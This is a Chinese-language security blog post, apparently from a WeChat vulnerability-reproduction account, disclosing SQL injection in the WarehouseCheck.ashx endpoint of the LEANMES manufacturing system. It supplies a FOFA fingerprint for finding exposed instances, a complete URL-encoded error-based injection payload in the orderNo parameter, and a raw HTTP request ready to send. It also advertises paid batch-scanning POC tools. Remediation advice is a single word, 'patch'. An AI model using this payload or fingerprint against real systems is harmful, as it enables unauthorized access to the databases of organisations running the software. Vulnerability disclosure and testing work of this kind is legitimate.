#  深科特LEANMES系统WarehouseCheck.ashx接口存在SQL注入 附POC  
2026-3-15更新
                    2026-3-15更新  南风漏洞复现文库   2026-03-15 15:40  
  
   
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 深科特LEANMES系统简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
本人只有 南风漏洞复现文库 和 南风网络安全  
 这两个公众号，其他公众号有意冒充，请注意甄别，避免上当受骗。  
  
深科特LEANMES  
## 2.漏洞描述  
  
深科特LEANMES-WarehouseCheck-sql注入，攻击者可进行sql注入攻击获取数据库信息或者权限。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
深科特LEANMES  
![深科特LEANMES系统WarehouseCheck.ashx接口存在SQL注入](https://mmbiz.qpic.cn/mmbiz_png/b9KQYsB8q6zKI6oaVua2wm0t9q8z5PggbeW8DHgOZY8IR0ZZFdsDeffKkHCMeRT1zaCGGNlHQiaicpniaUfCXiatXlwnsibqDxZ3DoK9dYTGtotM/640?wx_fmt=png&from=appmsg "null")  
  
深科特LEANMES系统WarehouseCheck.ashx接口存在SQL注入  
## 4.fofa查询语句  
  
icon_hash="1505132128"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/Handler/WarehouseCheck.ashx?api=GetGrnInfoList&orderNo=1%27+AND+9304+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289304%3D9304%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--+keHv&itemCode=1  
  
漏洞数据包：  
```
GET /Handler/WarehouseCheck.ashx?api=GetGrnInfoList&orderNo=1%27+AND+9304+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289304%3D9304%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--+keHv&itemCode=1 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6xp2JpFeZvNefNBdibsYyGibY4eTn0moTKML8G72u5Bokk4rVicVGqyicxp0FE7CogPEwbVHFgoCAumxic320ELl5viboFHxBWo2783w/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6y3ML7P9wjj2ic4A7Ho5ptxVd2659ic9LYsyYS6Btqo5yCUUHWDq80GolXClMuWsxsd4hbic5P1vIoap5jlxp18Iib5qybkXKr70z0/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
nuclei脚本  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6zD9ZwSEVtlCJ55cA5Tw8Hicv849HyBfpXfIP11uPvthOQibdq8r4TX7Zibfzibvz3MRbBV7VHNbiaQkQgibPVXYLeCIjpA5qyn2EzZE/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6w8gFl9HQ9rnicaN7UgOh6BqIrnsNQJm7yqOWH8gIo0HQJl1spicpLrKyC1emE3xuIGFc6xKBW0jnvdyoLGPMFBXuWm2V9hn5OVw/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6xHJjgo3nj2rp4B0cS7vEzRCz625Y3gbnI8gUHXCorp8NNctbO9SXNPSQicshQ5XmQqTNcGvpcmO1VbXYWial6UKQRX17ibh4yzNM/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6yldA5cOQx4HIVicXFdXyM7rumeoy3m3M8enC5AGpicHL5hicRvK5gXLpuL2wf7zsXMz84BsgGDF68NVnFVicVibViaRwFQMIljJSnXI/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6wrPVCP4FtK5TOQKg13TmkoBZMMn3mMsAAlx8dCKtoa0Nu11ticswvWJqGdwMBmdXh8LeBnq5VqcPAspOicWjbmOWdFDqBjFqmrw/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
  
[孚盟云CRM AjaxFormDefault.ashx接口存在SQL注入漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247490135&idx=1&sn=90b1e070a6a3cf52270df6b093f8d3b9&scene=21#wechat_redirect)  
  
  
